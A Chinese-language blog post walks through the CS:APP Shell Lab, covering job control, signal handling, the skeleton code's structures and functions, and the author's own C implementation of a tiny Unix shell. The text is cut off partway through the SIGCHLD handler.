<p>关于本实验的具体介绍详见<a href="http://csapp.cs.cmu.edu/3e/shlab.pdf" target="_blank" rel="noopener">实验讲义</a></p>
<h2 id="Shell介绍"><a href="#Shell介绍" class="headerlink" title="Shell介绍"></a>Shell介绍</h2><p>Shell是一个代表用户运行程序的命令行解释器。一个Shell周期性的打印一个提示符，从标准输入流等待一条命令行输入，然后根据命令行的输入执行相应的功能。</p>
<p>一条命令行输入是由空格分隔ASCII文本词(words)。命令行输入的第一个词要不然是一个内建命令(built-in command)要不然是一个可执行文件的路径。剩余的词是命令行参数。如果第一个词是内建命令，Shell立刻在当前进程中执行该命令。否则，词会被假设为一个可执行程序的路径。在这种情况下，Shell会fork出一个子进程，在子进程的上下文中加载并运行这个程序。被创建的子进程被称作任务(job)。总的来说，一个任务可以包含通过Unix管道(Unix Pipe)连接的多个子进程。</p>
<p>如果命令行输入以<code>&#39;&amp;&#39;</code>结尾，那么这个任务将会在后台执行，这意味着Shell在打印下一个提示符并等待下一条命令行输入之前不会等待当前任务终止。在默认情况下，任务运行在前台，这意味这Shell在下一条命令行输入之前会等待当前任务终止。在任何的情况下， 只能有一个任务运行在前台，但是，可以有多个任务运行在后台。</p>
<p>例如，输入<code>tsh&gt; jobs</code>使得Shell执行内建的jobs命令，输入<code>tsh&gt; /bin/ls -l -d</code>则在前台运行ls程序，同时，这个程序的argc == 3，argv[0] == “/bin/ls”a，argv[1] == “-l”，argv[2] == “-d”。相应地，输入<code>tsh&gt; /bin/ls -l -d &amp;</code>则会在后台运行ls程序。</p>
<p>Unix Shell支持作业控制的概念，这允许用户将任务在前台和后台间来回移动，并且改变一个任务中进程的状态（运行，停止，终止）。按下ctrl-c将会发送SIGINT信号到当前前台任务的每一个进程中。按下ctrl-z将会发送SIGTSTP信号到前台任务的每一个进程中，SIGTSTP信号的默认功能是将进程设置为停止状态，直到其被一个SIGCONT信号唤醒。Unix Shell提供了不同的内建命令来支持作业控制，如：</p>
<ul>
<li>jobs - 打印运行的和停止的后台任务</li>
<li>bg <job> - 将一个停止的后台任务转变为一个运行的后台任务</job></li>
<li>fb <job> - 将一个运行的或是停止的后台任务转变为一个运行的前台任务</job></li>
<li>kill <job> - 终止一个任务</job></li>
</ul>
<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>所实现的tsh shell应当具有如下的特性：</p>
<ul>
<li>提示符应当为<code>&quot;tsh&gt; &quot;</code></li>
<li>用户的命令行输入应当包括一个名字和0个或多个参数，均由一个或多个空格隔开。如果名字是一个内建命令，那么tsh应当立刻处理它并且等待下一个命令行输入。否则，tsh就会假设它是一个可执行文件的路径，并且在一个独立的子进程中加载并执行它</li>
<li>tsh不需要支持管道(|)和I/O重定向(&gt;和&lt;)</li>
<li>按下ctrl-c(ctrl-z)将会导致一个SIGINT(SIGTSTP)信号被发送至当前的前台任务，如果现在没有前台任务，那么这些信号将没有效果</li>
<li>如果命令行输入以一个<code>&#39;&amp;&#39;</code>结束，那么tsh将会在后台运行这个任务，否则它会在前台运行这个任务</li>
<li>每一个任务都可以被一个进程ID(PID)或是一个被tsh分配的正整数的任务ID(JID)唯一的标识。JIDS可以被前缀<code>&#39;%&#39;</code>标识，例如，<code>&#39;%5&#39;</code>就代表了JID 5，而<code>&#39;5&#39;</code>就代表了PID 5</li>
<li>tsh应当提供如下的内建命令：<ul>
<li>quit命令直接终止shell</li>
<li>jobs命令列出所有在后台运行的任务</li>
<li>bg <job>命令通过给<job>发送SIGCONT信号将其重启，然后将其在后台运行。参数<job>既可以是一个PID，也可以是一个JID</job></job></job></li>
<li>fg <job>命令通过给<job>发送SIGCONT信号将其重启，然后将其在前台运行。参数<job>既可以是一个PID，也可以使一个JID</job></job></job></li>
</ul>
</li>
<li>tsh应当回收它的所有僵死子进程。如果任何任务因为收到了一个未被捕获的信号而终止，那么tsh应当识别对应的事件并且输出相应的信息</li>
</ul>
<h2 id="实验评测"><a href="#实验评测" class="headerlink" title="实验评测"></a>实验评测</h2><ol>
<li>参考答案 - 实验提供了一个作为参考的tshref可执行文件作为tsh的参考。你的tsh应当提供和tshref一致的输出（除了PIDs以外）</li>
<li>Shell驱动 - sdriver.pl程序将shell作为一个子进程来执行，根据trace file来向它发送命令和信号，并且将shell的输出捕获并输出。实验总共提供了16个trace file。关于sdriver的具体用法请参考实验讲义。</li>
</ol>
<p>实验提供了tshref.out作为16个trace file在tshref程序下的参考输出。为了方便比较，写了一个小的（可能会有很多错误）的shell脚本gather_output.sh用来生成这些trace file在tsh下的输出，脚本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin bash</span></span><br><span class="line"></span><br><span class="line">output_file=tsh.out</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span> &gt; tsh.out</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n"</span> &gt;&gt; tsh.out</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> trace_file <span class="keyword">in</span> ./*.txt</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">"`./sdriver.pl -t <span class="variable">$trace_file</span> -s ./tsh -a "</span>-p<span class="string">"`"</span> &gt;&gt; tsh.out</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n"</span> &gt;&gt; tsh.out</span><br></pre></td></tr></table></figure></p>
<h2 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h2><blockquote>
<p>最早在做这个实验的时候一直没有什么头绪，即使已经参考了实验讲义，使用trace file来指导编程（trace file的难度自简单到复杂）。后来还是先好好的阅读了一遍给出的框架源代码，整理如下。</p>
</blockquote>
<h3 id="框架代码分析"><a href="#框架代码分析" class="headerlink" title="框架代码分析"></a>框架代码分析</h3><h4 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h4><table>
<thead>
<tr>
<th>宏</th>
<th>描述</th>
<th>值</th>
</tr>
</thead>
<tbody>
<tr>
<td>MAXLINE</td>
<td>定义了命令行1行允许的最大字符数</td>
<td>1024</td>
</tr>
<tr>
<td>MAXARGS</td>
<td>定义了命令行所允许的最大参数个数</td>
<td>128</td>
</tr>
<tr>
<td>MAXJOBS</td>
<td>定义了命令行同一时间允许的最多任务个数</td>
<td>16</td>
</tr>
<tr>
<td>MAXJID</td>
<td>定义了最大的任务ID</td>
<td>1&lt;&lt;16</td>
</tr>
<tr>
<td>UNDEF</td>
<td>未定义的状态</td>
<td>0</td>
</tr>
<tr>
<td>FG</td>
<td>任务运行在前台</td>
<td>1</td>
</tr>
<tr>
<td>BG</td>
<td>任务运行在后台</td>
<td>2</td>
</tr>
<tr>
<td>ST</td>
<td>任务停止</td>
<td>3</td>
</tr>
</tbody>
</table>
<blockquote>
<p>允许如下的状态转换<br>FG -&gt; ST : ctrl-z<br>ST -&gt; FG : fg命令<br>BG -&gt; FG : fg命令<br>ST -&gt; BG : bg命令</p>
</blockquote>
<h4 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> &#123;</span>              <span class="comment">//任务</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;              <span class="comment">//任务的PID</span></span><br><span class="line">    <span class="keyword">int</span> jid;                <span class="comment">//任务JID [1, 2, ...]</span></span><br><span class="line">    <span class="keyword">int</span> state;              <span class="comment">//状态 - 包括UNDEF, BG, FG, ST</span></span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];  <span class="comment">//对应的命令行输入</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><table>
<thead>
<tr>
<th>变量名</th>
<th>变量类型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>environ</td>
<td>char **</td>
<td>定义在libc中 环境变量</td>
</tr>
<tr>
<td>prompt</td>
<td>char[]</td>
<td>命令行提示符</td>
</tr>
<tr>
<td>verbose</td>
<td>int</td>
<td>为1时输出额外信息</td>
</tr>
<tr>
<td>nextjid</td>
<td>int</td>
<td>下一个待分配的JID</td>
</tr>
<tr>
<td>subf</td>
<td>char[MAXLINE]</td>
<td>用于生成sprintf信息</td>
</tr>
<tr>
<td>jobs</td>
<td>struct job_t [MAXJOBS]</td>
<td>全局任务表</td>
</tr>
</tbody>
</table>
<h4 id="函数列表"><a href="#函数列表" class="headerlink" title="函数列表"></a>函数列表</h4><table>
<thead>
<tr>
<th>函数名</th>
<th>函数原型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>parseline</td>
<td>int parseline(const char *cmdline, char **argv)</td>
<td>接收命令行输入以及参数列表，解析输入并且将解析到的参数存入参数列表，并且判断该命令是否以’&amp;’结尾，是则返回1，否则返回0</td>
</tr>
<tr>
<td>sigquit_handler</td>
<td>void sigquit_handler(int sig)</td>
<td>SIGQUIT的信号处理函数</td>
</tr>
<tr>
<td>clearjob</td>
<td>void clearjob(struct job_t *job)</td>
<td>将对应任务的PID，JID清零，状态设置为UNDEF，并且将命令行输入清空</td>
</tr>
<tr>
<td>initjobs</td>
<td>void initjobs(struct job_t *jobs)</td>
<td>将任务列表中的所有任务清空</td>
</tr>
<tr>
<td>maxjid</td>
<td>int maxjid(struct job_t *jobs)</td>
<td>返回任务列表中的最大JID</td>
</tr>
<tr>
<td>addjob</td>
<td>int addjob(struct job_t <em>jobs, pid_t pid, int state, char </em>cmdline)</td>
<td>将给定任务添加至任务列表，如果nextjid超过了MAXJOBS，则将其重置为1</td>
</tr>
<tr>
<td>deletejob</td>
<td>int deletejob(struct job_t *jobs, pid_t pid)</td>
<td>将对应任务从任务列表中删除，并将nextjid自增1</td>
</tr>
<tr>
<td>fgpid</td>
<td>pid_t fgpid(struct job_t *jobs)</td>
<td>返回当前前台任务的PID，如果没有则返回0</td>
</tr>
<tr>
<td>getjobpid</td>
<td>struct job_t <em>getjobpid(struct job_t </em>jobs, pid_t pid)</td>
<td>按照pid查询任务 如果没有则返回NULL</td>
</tr>
<tr>
<td>getjobjid</td>
<td>struct job_t <em>getjobjid(struct job_t </em>jobs, int jid)</td>
<td>按照jid查询任务 如果没有则返回NULL</td>
</tr>
<tr>
<td>pid2jid</td>
<td>int pid2jid(pid_t pid)</td>
<td>根据pid返回其jid，没有则返回0</td>
</tr>
<tr>
<td>listjobs</td>
<td>void listjobs(struct job_t *jobs)</td>
<td>打印任务队列</td>
</tr>
<tr>
<td>usage</td>
<td>void usage(void)</td>
<td>打印帮助信息</td>
</tr>
<tr>
<td>unix_error</td>
<td>void unix_error(char *msg)</td>
<td>打印系统级错误信息并结束进程</td>
</tr>
<tr>
<td>app_error</td>
<td>void app_error(char *msg)</td>
<td>打印应用级错误信息并结束进程</td>
</tr>
<tr>
<td>Signal</td>
<td>handler_t <em>Signal(int signum, handler_t </em>handler)</td>
<td>signal的包装函数</td>
</tr>
<tr>
<td>eval</td>
<td>void eval(char *cmdline)</td>
<td>求值函数</td>
</tr>
<tr>
<td>builtin_cmd</td>
<td>int builtin_cmd(char **argv)</td>
<td>处理内建函数</td>
</tr>
<tr>
<td>do_bgfg</td>
<td>void do_bgfg(char **argv)</td>
<td>实现内建的bg和fg</td>
</tr>
<tr>
<td>waitfg</td>
<td>void waitfg(pid_t pid)</td>
<td>等待前台的任务完成</td>
</tr>
<tr>
<td>sigchld_handler</td>
<td>void sigchld_handler(int sig)</td>
<td>SIGCHLD的信号处理程序</td>
</tr>
<tr>
<td>sigtstp_handler</td>
<td>void sigtstp_handler(int sig)</td>
<td>SIGTSTP的信号处理程序</td>
</tr>
<tr>
<td>sitint_handler</td>
<td>void sigint_handler(int sig)</td>
<td>SIGINT的信号处理程序</td>
</tr>
</tbody>
</table>
<h2 id="实验答案"><a href="#实验答案" class="headerlink" title="实验答案"></a>实验答案</h2><blockquote>
<p>为了简化篇幅，这里只附上几个相关的函数，已实现函数以及包装函数等就不一并附上。如有需要可以去GitHub中查看。</p>
</blockquote>
<p>实验答案为我自己的实验解法，很可能不是最优解法，请不要直接抄袭。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * argv[MAXARGS];</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> bg; <span class="comment">/* if run in background */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_chld, prev_chld;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*initialize signal sets*/</span></span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    Sigemptyset(&amp;mask_chld);</span><br><span class="line">    Sigaddset(&amp;mask_chld, SIGCHLD);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv); <span class="comment">/* parse the command line */</span></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="comment">/* handles if there is empty input */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123; <span class="comment">/* if the command line is builtin command */</span></span><br><span class="line">        Sigprocmask(SIG_BLOCK, &amp;mask_chld, &amp;prev_chld); <span class="comment">/* block SIGCHLD to avoid potential race between addjob and deletejob */</span></span><br><span class="line">        <span class="keyword">if</span> ((pid = Fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">            Setpgid(<span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* give the child process a new group id to handle SIGINT correctly */</span></span><br><span class="line">            Sigprocmask(SIG_SETMASK, &amp;prev_chld, <span class="literal">NULL</span>); <span class="comment">/* unblock SIGCHLD */</span></span><br><span class="line">            Execve(argv[<span class="number">0</span>], argv, environ);</span><br><span class="line">        &#125;</span><br><span class="line">        Sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>); <span class="comment">/* mask all signals to avoid potential races */</span></span><br><span class="line">        addjob(jobs, pid, bg + <span class="number">1</span>, cmdline); <span class="comment">/* add job to joblist */</span></span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_chld, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (!bg) &#123; <span class="comment">/* if the process should be exeuted in foreground */</span></span><br><span class="line">            waitfg(pid); <span class="comment">/* fg wait explictly */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, pid2jid(pid), pid, cmdline); <span class="comment">/* bg print message*/</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* handles the builtin command in current context */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"quit"</span>)) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* quit: exit directly*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"jobs"</span>)) &#123;</span><br><span class="line">        listjobs(jobs); <span class="comment">/* jobs: print the current job list */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) &#123;</span><br><span class="line">        do_bgfg(argv); <span class="comment">/* bg|fg: handles in function do_bgfg */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"&amp;"</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">/* returns 1 for empty &amp; */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">0</span>; <span class="comment">/* used to store the converted number */</span></span><br><span class="line">    <span class="keyword">char</span> * ptr = argv[<span class="number">1</span>]; <span class="comment">/* get the pointer to argument 1 */</span></span><br><span class="line">    <span class="keyword">char</span> * endptr = <span class="literal">NULL</span>; <span class="comment">/* used for error handling */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">job</span> = <span class="title">NULL</span>;</span> <span class="comment">/* used to store job pointer */</span></span><br><span class="line">    <span class="keyword">if</span> (!argv[<span class="number">1</span>]) &#123; <span class="comment">/* returns if missing argument */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*ptr == <span class="string">'%'</span>) &#123; <span class="comment">/* if argument 1 is job ID */</span></span><br><span class="line">        ptr++; <span class="comment">/* adjust pointer */</span></span><br><span class="line">        number = strtol(ptr, &amp;endptr, <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (ptr == endptr) &#123; <span class="comment">/* handles convert error */</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        job = getjobjid(jobs, number); <span class="comment">/* get the job */</span></span><br><span class="line">        <span class="keyword">if</span> (!job) &#123;<span class="comment">/* handles if there is no such job */</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%%%d: No such job\n"</span>, number);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">/* if argument 1 is pid */</span></span><br><span class="line">        number = strtol(ptr, &amp;endptr, <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (ptr == endptr) &#123; <span class="comment">/* handles convert error */</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        job = getjobpid(jobs, (<span class="keyword">pid_t</span>)number); <span class="comment">/* get the job */</span></span><br><span class="line">        <span class="keyword">if</span> (!job) &#123;<span class="comment">/* handles if there is no such job */</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"(%d): No such process\n"</span>, number);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* change process state and update the job list*/</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>)) &#123; <span class="comment">/*bg: turns ST to BG, send SIGCONT */</span></span><br><span class="line">        <span class="keyword">if</span>(job-&gt;state == ST) &#123;</span><br><span class="line">            Kill(-(job-&gt;pid), SIGCONT);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">            job-&gt;state = BG;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) &#123;<span class="comment">/* fg: turns ST/BG to FG, sent SIGCONT */</span></span><br><span class="line">        <span class="keyword">if</span>(job-&gt;state == ST) &#123;</span><br><span class="line">            Kill(-(job-&gt;pid), SIGCONT);</span><br><span class="line">            job-&gt;state = BG;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(job-&gt;state == BG) &#123;</span><br><span class="line">            job-&gt;state = FG;</span><br><span class="line">            waitfg(job-&gt;pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(fgpid(jobs)) &#123; <span class="comment">/* handles all zombie processes in signal handler */</span></span><br><span class="line">        sleep(<span class="number">0.01</span>); <span class="comment">/* busy loop only */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno; <span class="comment">/* store old errno */</span></span><br><span class="line">    <span class="keyword">int</span> status; <span class="comment">/* used to trace pid's status */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((pid = Waitpid(<span class="number">-1</span>, &amp;status, WUNTRACED | WNOHANG)) &gt; <span class="number">0</span>) &#123; <span class="comment">/* waitpid without waiting(WNOHANG) */</span></span><br><span class="line">        <span class="keyword">if</span> (WIFSTOPPED(status) &amp;&amp; (WSTOPSIG(status) == SIGTSTP || WSTOPSIG(status) == SIGSTOP)) &#123; <span class="comment">/* if the process is stopped */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line">            <span class="keyword">if</span> (job &amp;&amp; job-&gt;state != ST) &#123; <span class="comment">/* if the stop signal hasn't been catched */</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>, pid2jid(pid), pid, WSTOPSIG(status));</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">stpjob</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line">                stpjob-&gt;state = ST;<span class="comment">/* handles here */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (WIFSIGNALED(status) &amp;&amp; WTERMSIG(status) == SIGINT) &#123; <span class="comment">/* it the terminate signal hasn't been catched */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line">            <span class="keyword">if</span> (job) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, pid2jid(pid), pid, WTERMSIG(status));</span><br><span class="line">                <span class="comment">/* handles here */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status) || WIFSIGNALED(status)) &#123;</span><br><span class="line">            Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">            Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;<span 